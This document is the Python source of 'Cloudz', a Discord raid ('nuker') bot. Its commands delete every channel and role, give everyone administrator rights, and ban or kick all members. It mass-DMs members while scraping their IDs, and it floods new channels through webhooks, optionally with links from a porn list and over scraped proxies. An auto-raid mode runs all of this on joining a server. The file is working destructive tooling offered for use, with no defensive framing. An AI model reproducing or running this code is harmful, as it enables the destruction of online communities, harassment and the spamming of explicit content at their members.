import json
import os
import random
import sys
import threading
import asyncio
import colorama
import discord
import requests
from colorama import Fore
from discord import Permissions
from discord.ext import commands
from tqdm import tqdm

from pystyle import Colorate, Colors, Center
from util.proxies import proxy_scrape, proxy

colorama.deinit()

__author__ = 'ProfessedRay4#1436'

with open('config.json', 'r') as f:
    config = json.load(f)
    TOKEN = config["TOKEN"]
    CHANNEL_NAMES = config["CHANNEL_NAMES"]
    MESSAGE = config["MESSAGE"]
    PREFIX = config["PREFIX"]
    AMOUNT_OF_CHANNELS = config["AMOUNT_OF_CHANNELS"]
    SERVER_NAME = config["SERVER_NAME"]
    SPAM_PRN = config["SPAM_PRN"]
    PROXIES = config["PROXIES"]
    AUTO_RAID = config["AUTO_RAID"]
    OWNER = config["OWNER"]

intents = discord.Intents.all()
client = commands.Bot(command_prefix=PREFIX, owner_id=OWNER, intents=intents)
client.remove_command('help')


def start():
    print(Center.XCenter(Colorate.Vertical(Colors.purple_to_red, """
     ▄████▄   ██▓     ▒█████   █    ██ ▓█████▄ ▒███████▒
    ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██  ▓██▒▒██▀ ██▌▒ ▒ ▒ ▄▀░
    ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▒██░░██   █▌░ ▒ ▄▀▒░ 
    ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓▓█  ░██░░▓█▄   ▌  ▄▀▒   ░
    ▒ ▓███▀ ░░██████▒░ ████▓▒░▒▒█████▓ ░▒████▓ ▒███████▒
    ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▒ ▓░▒░▒
      ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░░▒░ ░ ░  ░ ▒  ▒ ░░▒ ▒ ░ ▒
    ░          ░ ░   ░ ░ ░ ▒   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ░ ░
    ░ ░          ░  ░    ░ ░     ░        ░      ░ ░    
    ░                                   ░      ░        
                Made by ProfessedRay4#2985
    """, 2)))
    print(Colorate.Vertical(Colors.red_to_purple, f"""
    Prefix = {PREFIX}
    Owner = {OWNER}

    =====COMMANDS=====
    
    {PREFIX}nuke - Nukes the server
    {PREFIX}ban_all - bans everyone
    {PREFIX}kick_all - Kicks everyone
    {PREFIX}massdm - attempts to dm all members
    {PREFIX}admin - Gives everyone admin
    {PREFIX}channels - Creates {AMOUNT_OF_CHANNELS} channels and spams with webhooks  :3
    {PREFIX}rename - Rename server to {SERVER_NAME}
    """))


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"prefix {PREFIX}"))
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system("title " + "Cloudz")
    start()


@client.event
async def on_guild_join(ctx):
    with open('config.json', 'r') as config_file:
        araid = json.load(config_file)

    auto_raid_enabled = araid.get('AUTO_RAID', False)

    if auto_raid_enabled:
        print(Fore.GREEN + f"> Joined {ctx.guild.name}, starting raid")

        for channel in ctx.guild.channels:
            await channel.delete()

        try:
            role = discord.utils.get(ctx.guild.roles, name="@everyone")
            await role.edit(permissions=Permissions.all())
        except:
            print(Fore.RED + f"> couldn't give everyone admin in {ctx.guild.name}")

        num_channels = AMOUNT_OF_CHANNELS

        for i in tqdm(range(int(num_channels))):
            try:
                kdot = await ctx.guild.create_text_channel(name=CHANNEL_NAMES)
                webhook = await kdot.create_webhook(name='woof')
                threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print(Fore.RED + f'> Failed to create channels in {ctx.guild.name}')

    else:
        print(Fore.BLUE + f"> Joined {ctx.guild.name} but skipped auto raid (set to true in config.json)")


@client.command()
@commands.is_owner()
async def nuke(ctx):
    print(Fore.BLUE + f'> Nuking {ctx.guild.name}')
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))

        print(Fore.BLUE + f'> Giving everyone admin in {ctx.guild.name}')
        try:
            role = discord.utils.get(ctx.guild.roles, name="@everyone")
            await role.edit(permissions=Permissions.all())
        except:
            print(Fore.RED + f"> couldn't give everyone admin in {ctx.guild.name}")

        print(Fore.BLUE + f'> Deleting all roles in {ctx.guild.name}')
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print(f"> couldn't delete {role} in {ctx.guild.name}")

        # delete all channels
        print(Fore.BLUE + f'> Deleting all channels in {ctx.guild.name}')
        for channel in tqdm(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                print(Fore.RED + "> Could not delete channels")

        # make channels
        print('')
        print(Fore.BLUE + f'> Making channels in {ctx.guild.name}')
        for i in tqdm(range(int(AMOUNT_OF_CHANNELS))):
            try:
                kdot = await ctx.guild.create_text_channel(name=CHANNEL_NAMES)
                webhook = await kdot.create_webhook(name='سيء السمعة')
                threading.Thread(target=spamhook, args=(webhook.url,)).start()
            except:
                print(Fore.RED + f'> Failed to create channels in {ctx.guild.name}')
        print(Fore.GREEN + f"> Succesfully raided {ctx.guild.name}")
    except:
        print(Fore.RED + f"Failed to raid {ctx.guild.name}")


@client.command()
@commands.is_owner()
async def massdm(ctx):
    await ctx.message.delete()  # meow :3
    for user in ctx.guild.members:
        try:
            from random import randint
            num = randint(1, 2)  # makes discord not lick ur weiner (sometimes)
            await user.send(MESSAGE)  # sends dm
            print(Fore.GREEN + f"> Dm'd {user.name}")  # print who we dm
            with open('scrape.txt', 'a') as f:  # open scrape.txt
                f.write(str(user.id) + '\n')  # write user id to scrape.txt
        except:  # if it gets fucked
            print(Fore.RED + f"> Failed to dm {user.name}")  # use isn't accepting dm's rn


@client.command()
@commands.is_owner()
async def ban_all(ctx):
    await ctx.message.delete()
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason='Banned by ProfessedRay4#1436')
                print(Fore.BLUE + f'> Banned {member.name}')
                asyncio.wait(.5)
            except:
                print(Fore.RED + f'> Failed to ban {member.name}')
    except:
        print(Fore.GREEN + f'> Banned all members in {ctx.guild.name}')


@client.command()
@commands.is_owner()
async def kick_all(ctx):
    try:
        await ctx.message.delete()
        for member in ctx.guild.members:
            await member.kick(reason=f'Kicked by {OWNER}')
            print(Fore.BLUE + f'> Kicked {member.name}')
            asyncio.wait(.5)
    except:
        print(Fore.RED + f'> Failed to kick {ctx.member.name}')


@client.command()
@commands.is_owner()
async def admin(ctx):
    try:
        await ctx.message.delete()
        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.GREEN + f"> Successfully gave everyone admin in {ctx.guild.name}")
    except:
        print(Fore.RED + f"> Couldn't give everyone admin in {ctx.guild.name}")


@client.command()
@commands.is_owner()
async def channels(ctx):
    for i in tqdm(range(int(AMOUNT_OF_CHANNELS))):
        try:
            await ctx.message.delete()
            print(Fore.BLUE + f'> Making channels in {ctx.guild.name}')
            kdot = await ctx.guild.create_text_channel(name=CHANNEL_NAMES)
            webhook = await kdot.create_webhook(name='سيء السمعة')
            threading.Thread(target=spamhook, args=(webhook.url,)).start()
        except:
            print(Fore.RED + f'> Failed to create channels in {ctx.guild.name}')


@client.command()
@commands.is_owner()
async def rename(ctx):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=str(SERVER_NAME))
        print(Fore.GREEN + f"Renamed to {ctx.guild.name}")
    except:
        print(Fore.RED + f"Failed to rename {ctx.guild.name}")


###### HELP FOR COMMANDS ######


def spamhookp(hook):
    for i in range(int(AMOUNT_OF_CHANNELS)):
        if SPAM_PRN:
            try:
                with open('porn.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0, len(lines) - 1)
                    ran = lines[random_int]
                requests.post(hook, data={'content': f"{MESSAGE} + {ran}"}, proxies=proxy())
            except:
                print(Fore.RED + f'> error spamming! {hook}')
        else:
            try:
                requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
            except:
                print(Fore.RED + f'> error spamming! {hook}')
    sys.exit()


def spamhook(hook):
    for i in range(int(AMOUNT_OF_CHANNELS)):
        if SPAM_PRN:
            try:
                with open('porn.txt') as f:
                    lines = f.readlines()
                    random_int = random.randint(0, len(lines) - 1)
                    ran = lines[random_int]
                requests.post(hook, data={'content': f"{MESSAGE} + {ran}"})
            except:
                print(Fore.RED + f'> error spamming! {hook}')
        else:
            try:
                requests.post(hook, data={'content': MESSAGE})
            except:
                print(Fore.RED + f'> error spamming! {hook}')
    sys.exit()


###### START BOT ######
if PROXIES:
    proxy_scrape()

try:
    client.run(TOKEN)
except Exception as e:
    print(Fore.RED + f"Cloudz ran into this error when running:\n {e}")
    input()
    os._exit(0)
